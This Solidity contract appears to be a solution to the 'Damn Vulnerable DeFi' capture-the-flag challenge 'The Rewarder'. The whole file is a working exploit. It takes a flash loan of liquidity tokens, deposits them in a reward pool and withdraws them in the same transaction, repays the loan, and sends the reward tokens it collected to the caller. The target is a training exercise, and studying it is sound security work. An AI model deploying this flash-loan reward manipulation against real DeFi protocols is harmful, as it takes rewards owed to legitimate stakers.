// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface IDamnValuableToken {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address) external returns (uint256);
}

interface IRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
}

interface IRewardToken {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address) external returns (uint256);
}

contract FlashLoanTheRewarder {
    using Address for address payable;

    address payable private lenderPool;
    //address payable private liquidityToken;
    address payable private rewarderPool;
    address payable private attacker;
    address payable private rewardToken;

    address payable private liquidityToken;

    uint256 public testUint;

    constructor (address payable _lenderPool, address payable _liquidityToken, address payable _rewardToken, address payable _rewarderPool, address payable _attacker) {
        lenderPool = _lenderPool;
        //liquidityToken = _liquidityToken;
        liquidityToken = _liquidityToken;
        rewarderPool = _rewarderPool;
        rewardToken = _rewardToken;
        attacker = _attacker;
    }

    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == lenderPool, "Sender must be pool");

        // Flashloan Borrow : Receive liquidity token(DTV) from LenderPool(flashloan)
        uint256 amountToBeRepaid = amount;

        IDamnValuableToken(liquidityToken).approve(rewarderPool, amountToBeRepaid);

        IRewarderPool(rewarderPool).deposit(amountToBeRepaid);
        IRewarderPool(rewarderPool).withdraw(amountToBeRepaid);
        
        // Flashloan Repayment : Pay back to LenderPool(flashloan)
        IDamnValuableToken(liquidityToken).transfer(lenderPool, amountToBeRepaid);
        
    }

    function execFlashLoans(uint256 amount) external {
        IFlashLoanerPool(lenderPool).flashLoan(amount);

        IRewardToken(rewardToken).transfer(
            msg.sender,
            IRewardToken(rewardToken).balanceOf(address(this))
        );
        
    }

    receive () external payable {}
}